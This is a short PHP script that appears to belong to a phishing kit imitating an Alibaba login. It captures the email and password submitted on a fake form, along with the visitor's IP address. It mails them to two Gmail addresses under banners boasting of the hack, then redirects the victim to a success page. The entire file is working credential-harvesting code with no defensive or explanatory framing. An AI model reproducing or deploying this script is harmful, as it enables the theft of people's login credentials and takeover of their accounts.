<?

$ip = getenv("REMOTE_ADDR");
$message .= "+++++++++++++Alibaba Hacked by Whizzy++++++++++++\n";
$message .= "Email: ".$_POST['email']."\n";
$message .= "Password: ".$_POST['password']."\n";
$message .= "++++++++++++++++IP and Date+++++++++++++++\n";
$message .= "IP Address: ".$ip."\n";
$message .= "Date: ".$adddate."\n";
$message .= "+++++++++++Created Hacker Gerald+++++++++++\n";
$recipient = "zvedyn2008@gmail.com,juletserena102@gmail.com";
$subject = "I.K. ZeuS Excel";
$headers = "From";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
     mail("$to","$subject", $message);
         mail($recipient,$subject,$message,$headers);

       {
           header("Location: success.php");

       }

?>